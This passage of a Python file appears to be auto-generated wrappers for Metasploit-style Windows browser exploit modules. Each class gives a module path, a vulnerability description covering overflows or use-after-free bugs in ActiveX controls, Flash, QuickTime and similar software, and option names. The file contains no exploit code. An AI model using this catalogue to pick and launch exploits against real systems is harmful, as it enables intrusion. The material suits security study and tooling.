			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_athocgov_completeinstallation(object):
		"""
		
          This module exploits a stack buffer overflow in AtHocGov IWSAlerts. When
        sending an overly long string to the CompleteInstallation() method of AtHocGovTBr.dll
        (6.1.4.36) an attacker may be able to execute arbitrary code. This
        vulnerability was silently patched by the vendor.
      
		"""

		path = 'windows/browser/athocgov_completeinstallation'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_ms09_043_owc_htmlurl(object):
		"""
		
          This module exploits a buffer overflow in Microsoft's Office Web Components.
        When passing an overly long string as the "HTMLURL" parameter an attacker can
        execute arbitrary code.
      
		"""

		path = 'windows/browser/ms09_043_owc_htmlurl'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			required_URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_kazaa_altnet_heap(object):
		"""
		
          This module exploits a stack buffer overflow in the Altnet Download Manager ActiveX
        Control (amd4.dll) bundled with Kazaa Media Desktop 3.2.7.
        By sending a overly long string to the "Install()" method, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/browser/kazaa_altnet_heap'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_realplayer_qcp(object):
		"""
		
          This module exploits a heap overflow in Realplayer when handling a .QCP file.
          The specific flaw exists within qcpfformat.dll. A static 256 byte buffer is
          allocated on the heap and user-supplied data from the file is copied within a
          memory copy loop.

          This allows a remote attacker to execute arbitrary code running in the context
          of the web browser via a .QCP file with a specially crafted "fmt" chunk.
          At this moment this module exploits the flaw on Windows XP IE6, IE7.
        
		"""

		path = 'windows/browser/realplayer_qcp'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_wellintech_kingscada_kxclientdownload(object):
		"""
		
        This module abuses the kxClientDownload.ocx ActiveX control distributed with WellingTech KingScada.
        The ProjectURL property can be abused to download and load arbitrary DLLs from
        arbitrary locations, leading to arbitrary code execution, because of a dangerous
        usage of LoadLibrary. Due to the nature of the vulnerability, this module will work
        only when Protected Mode is not present or not enabled.
      
		"""

		path = 'windows/browser/wellintech_kingscada_kxclientdownload'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_adobe_flash_regex_value(object):
		"""
		
        This module exploits a vulnerability found in the ActiveX component of Adobe
        Flash Player before 11.5.502.149. By supplying a specially crafted swf file
        with special regex value, it is possible to trigger an memory corruption, which
        results in remote code execution under the context of the user, as exploited in
        the wild in February 2013. This module has been tested successfully with Adobe
        Flash Player 11.5 before 11.5.502.149 on Windows XP SP3 and Windows 7 SP1 before
        MS13-063, since it takes advantage of a predictable SharedUserData in order to
        leak ntdll and bypass ASLR.
      
		"""

		path = 'windows/browser/adobe_flash_regex_value'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			JsObfuscate = 'JsObfuscate'
			JsIdentifiers = 'JsIdentifiers'
			Retries = 'Retries'
			CookieName = 'CookieName'
			CookieExpiration = 'CookieExpiration'
			Custom404 = 'Custom404'

	class windows_browser_novell_groupwise_gwcls1_actvx(object):
		"""
		
          This module exploits a vulnerability in the Novell GroupWise Client gwcls1.dll
        ActiveX. Several methods in the GWCalServer control use user provided data as
        a pointer, which allows to read arbitrary memory and execute arbitrary code. This
        module has been tested successfully with GroupWise Client 2012 on IE6 - IE9. The
        JRE6 needs to be installed to achieve ASLR bypass.
      
		"""

		path = 'windows/browser/novell_groupwise_gwcls1_actvx'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_novelliprint_target_frame(object):
		"""
		
        This module exploits a stack buffer overflow in Novell iPrint Client 5.30. When
        passing an overly long string via the "target-frame" parameter to ienipp.ocx
        an attacker can execute arbitrary code.

        NOTE: The "operation" variable must be set to a valid command in order to reach this
        vulnerability.
      
		"""

		path = 'windows/browser/novelliprint_target_frame'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			DynamicSehRecord = 'DynamicSehRecord'

	class windows_browser_zenworks_helplauncher_exec(object):
		"""
		
          This module exploits a vulnerability in AdminStudio LaunchHelp.dll ActiveX control. The
        LaunchProcess function found in LaunchHelp.HelpLauncher.1 allows remote attackers to run
        arbitrary commands on the victim machine. This module has been successfully tested with the
        ActiveX installed with AdminStudio 9.5, which also comes with Novell ZENworks Configuration
        Management 10 SP2, on IE 6 and IE 8 over Windows XP SP 3.
      
		"""

		path = 'windows/browser/zenworks_helplauncher_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'
			required_WINDOWSTEMP = 'WINDOWSTEMP'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_verypdf_pdfview(object):
		"""
		
          The VeryPDF PDFView ActiveX control is prone to a heap buffer-overflow
        because it fails to properly bounds-check user-supplied data before copying
        it into an insufficiently sized memory buffer. An attacker can exploit this issue
        to execute arbitrary code within the context of the affected application.
      
		"""

		path = 'windows/browser/verypdf_pdfview'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_oracle_webcenter_checkoutandopen(object):
		"""
		
          This modules exploits a vulnerability found in the Oracle WebCenter Content
        CheckOutAndOpenControl ActiveX. This vulnerability exists in openWebdav(), where
        user controlled input is used to call ShellExecuteExW(). This module abuses the
        control to execute an arbitrary HTA from a remote location. This module has been
        tested successfully with the CheckOutAndOpenControl ActiveX installed with Oracle
        WebCenter Content 11.1.1.6.0.
      
		"""

		path = 'windows/browser/oracle_webcenter_checkoutandopen'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			EXE_EICAR = 'EXE::EICAR'
			EXE_Custom = 'EXE::Custom'
			EXE_Path = 'EXE::Path'
			EXE_Template = 'EXE::Template'
			EXE_Inject = 'EXE::Inject'
			EXE_OldMethod = 'EXE::OldMethod'
			EXE_FallBack = 'EXE::FallBack'
			MSI_EICAR = 'MSI::EICAR'
			MSI_Custom = 'MSI::Custom'
			MSI_Path = 'MSI::Path'
			MSI_Template = 'MSI::Template'
			MSI_UAC = 'MSI::UAC'

	class windows_browser_ibm_spss_c1sizer(object):
		"""
		
          This module exploits a heap based buffer overflow in the C1Tab ActiveX control,
        while handling the TabCaption property. The affected control can be found in the
        c1sizer.ocx component as included with IBM SPSS SamplePower 3.0. This module has
        been tested successfully on IE 6, 7 and 8 on Windows XP SP3 and IE 8 on Windows 7
        SP1.
      
		"""

		path = 'windows/browser/ibm_spss_c1sizer'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_winamp_ultravox(object):
		"""
		
          This module exploits a stack buffer overflow in Winamp 5.24. By
        sending an overly long artist tag, a remote attacker may
        be able to execute arbitrary code. This vulnerability can be
        exploited from the browser or the winamp client itself.
      
		"""

		path = 'windows/browser/winamp_ultravox'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'

	class windows_browser_intrust_annotatex_add(object):
		"""
		
          This module exploits an uninitialized variable vulnerability in the
        Annotation Objects ActiveX component. The activeX component loads into memory without
        opting into ALSR so this module exploits the vulnerability against windows Vista and
        Windows 7 targets. A large heap spray is required to fulfill the requirement that EAX
        points to part of the ROP chain in a heap chunk and the calculated call will hit the
        pivot in a separate heap chunk. This will take some time in the users browser.
      
		"""

		path = 'windows/browser/intrust_annotatex_add'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_nis2004_get(object):
		"""
		
          This module exploits a stack buffer overflow in the ISAlertDataCOM ActiveX
        Control (ISLAert.dll) provided by Symantec Norton Internet Security 2004.
        By sending a overly long string to the "Get()" method, an attacker may be
        able to execute arbitrary code.
      
		"""

		path = 'windows/browser/nis2004_get'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'

	class windows_browser_msxml_get_definition_code_exec(object):
		"""
		
          This module exploits a memory corruption flaw in Microsoft XML Core Services
        when trying to access an uninitialized Node with the getDefinition API, which
        may corrupt memory allowing remote code execution.
      
		"""

		path = 'windows/browser/msxml_get_definition_code_exec'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_getgodm_http_response_bof(object):
		"""
		
          This module exploits a stack-based buffer overflow vulnerability in
        GetGo Download Manager version 4.9.0.1982 and earlier, caused by an
        overly long HTTP response header.

        By persuading the victim to download a file from a malicious server, a
        remote attacker could execute arbitrary code on the system or cause
        the application to crash. This module has been tested successfully on
        Windows XP SP3.
      
		"""

		path = 'windows/browser/getgodm_http_response_bof'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			DynamicSehRecord = 'DynamicSehRecord'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'

	class windows_browser_apple_quicktime_texml_font_table(object):
		"""
		
          This module exploits a vulnerability found in Apple QuickTime. When handling
        a TeXML file, it is possible to trigger a stack-based buffer overflow, and then
        gain arbitrary code execution under the context of the user.  This is due to the
        QuickTime3GPP.gtx component not handling certain Style subfields properly, as the
        font-table field, which is used to trigger the overflow in this module. Because of
        QuickTime restrictions when handling font-table fields, only 0x31-0x39 bytes can be
        used to overflow, so at the moment DEP/ASLR bypass hasn't been provided. The module
        has been tested successfully on IE6 and IE7 browsers (Windows XP and Vista).
      
		"""

		path = 'windows/browser/apple_quicktime_texml_font_table'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ms13_009_ie_slayoutrun_uaf(object):
		"""
		
        This module exploits a use-after-free vulnerability in Microsoft Internet Explorer
        where a CParaElement node is released but a reference is still kept
        in CDoc. This memory is reused when a CDoc relayout is performed.
      
		"""

		path = 'windows/browser/ms13_009_ie_slayoutrun_uaf'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
			SSLCompression = 'SSLCompression'
			SSLCipher = 'SSLCipher'
			TCP_max_send_size = 'TCP::max_send_size'
			TCP_send_delay = 'TCP::send_delay'
			URIPATH = 'URIPATH'
			HTTP_chunked = 'HTTP::chunked'
			HTTP_header_folding = 'HTTP::header_folding'
			HTTP_junk_headers = 'HTTP::junk_headers'
			HTTP_compression = 'HTTP::compression'
			required_HTTP_server_name = 'HTTP::server_name'
			URIHOST = 'URIHOST'
			URIPORT = 'URIPORT'
			HTML_unicode = 'HTML::unicode'
			HTML_base64 = 'HTML::base64'
			HTML_javascript_escape = 'HTML::javascript::escape'
			OBFUSCATE = 'OBFUSCATE'

	class windows_browser_ibmlotusdomino_dwa_uploadmodule(object):
		"""
		
          This module exploits a stack buffer overflow in IBM Lotus Domino Web Access Upload Module.
        By sending an overly long string to the "General_ServerName()" property located
        in the dwa7w.dll and the inotes6w.dll control, an attacker may be able to execute
        arbitrary code.
      
		"""

		path = 'windows/browser/ibmlotusdomino_dwa_uploadmodule'
		class options(object):
			WORKSPACE = 'WORKSPACE'
			VERBOSE = 'VERBOSE'
			EnableContextEncoding = 'EnableContextEncoding'
			ContextInformationFile = 'ContextInformationFile'
			DisablePayloadHandler = 'DisablePayloadHandler'
			SSL = 'SSL'
			SSLCert = 'SSLCert'
			required_SRVHOST = 'SRVHOST'
			required_SRVPORT = 'SRVPORT'
			ListenerComm = 'ListenerComm'
